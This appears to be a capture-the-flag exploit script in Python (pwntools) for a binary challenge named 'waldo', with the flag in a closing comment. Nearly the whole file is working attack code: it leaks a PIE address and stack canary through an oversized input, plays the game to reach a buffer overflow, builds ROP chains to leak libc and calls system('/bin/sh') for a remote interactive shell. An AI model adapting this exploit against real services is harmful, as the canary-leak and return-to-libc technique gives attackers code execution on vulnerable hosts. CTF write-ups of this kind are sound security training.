#!/usr/bin/env python
from pwn import *

# setting 
HOST = "waldo.420blaze.in"
PORT = 420
ELF_PATH = "./waldo"


'''
libc6_2.23-0ubuntu10_amd64 on server
'''

context.binary = ELF_PATH


elf = ELF(ELF_PATH)
libc = ELF("libc6_2.23-0ubuntu10_amd64.so")

# remote, local, gdb
DEBUG = int(sys.argv[1]);
if(DEBUG == 0):
	r = remote(HOST, PORT);
elif(DEBUG == 1):
	r = process(ELF_PATH);
elif(DEBUG == 2):
	r = process(ELF_PATH);
	gdb.attach(r, '''continue''');


def hlt(): raw_input('[?] Hit enter to continue')


def leak():
	#spray stack
	payload = "A"*1135

	r.sendlineafter("Waldo?", "1 1")
	r.sendlineafter('(y/N)', 'y')
	r.sendlineafter("Waldo?", payload)
	r.sendlineafter('(y/N)', 'y')
	r.readline()
	r.recv(8)
	pie_leak = u64(r.recv(8))
	r.recv(8)
	canary = u64(r.recv(8))

	elf.address = pie_leak-0xc43

	log.success("Pie leak: 0x{:x}".format(pie_leak))
	log.info("Canary: 0x{:x}".format(canary))

	r.sendlineafter("Waldo?", "-2 -2")
	r.sendlineafter('(y/N)', 'y')
	return canary

def play():
	r.readline() #empty line	
	row = -1
	col = -1
	while(col == -1):
		row += 1
		data = r.recvuntil('\n')
		col = data.find('W')
	#log.success(str(row) + " " + str(col))
	r.sendlineafter('Waldo?', str(row) + " " + str(col))

def main():
	log.info("Maybe needs multiple tries")
	log.info("If canay does not end in 00")
	log.info("Or leaked read@got not in 250")
	log.info("Run it again until it works (~5 tries)")

	# LEAK AND WIN
	r.sendlineafter('(y/N)', 'y')
	canary = leak()
	play()
	for i in range(31):
		r.recvuntil('Waldone!')
		r.readline()
		play()

	# WON, OVERFLOW, ROP
	rop = ROP(elf, badchars="\n")
	rop.printf(elf.got.read)
	rop.printf(elf.got.write)
	rop.raw((elf.address+0xef2))
	log.info(rop.dump())
	
	rbp = elf.address + 4096 

	payload = "A"*72 + p64(canary) + p64(rbp) + str(rop)
	r.sendlineafter("name:", payload)
	
	r.recvuntil("A!")
	r.recvline()
	sleep(0.5)
	read_libc = (u64(r.recv(8).ljust(8, "\x00")))
	read_libc = int("0x" + hex(read_libc)[-12:],16)
	log.success("Read@libc: 0x{:x}".format(read_libc))
	libc.address = read_libc - libc.sym.read
	log.success("System: 0x{:x}".format(libc.sym.system))
	
	# START AGAIN
	r.sendlineafter('(y/N)', 'y')
	play()
	for i in range(31):
		r.recvuntil('Waldone!')
		r.readline()
		play()

	# WON, OVERFLOW, ROP, 2
	rop = ROP(libc, badchars="\n")
	rop.system(next(libc.search("/bin/sh")))
	log.info(rop.dump())
	
	payload = "A"*72 + p64(canary) + p64(rbp) + str(rop)
	print r.sendlineafter("name:", payload)
	r.interactive()


if __name__ == '__main__':
	main()

'''
blaze{B4D_alloca_4nD_sTup1D_r3cURs10n_3P1C_F41L}
'''
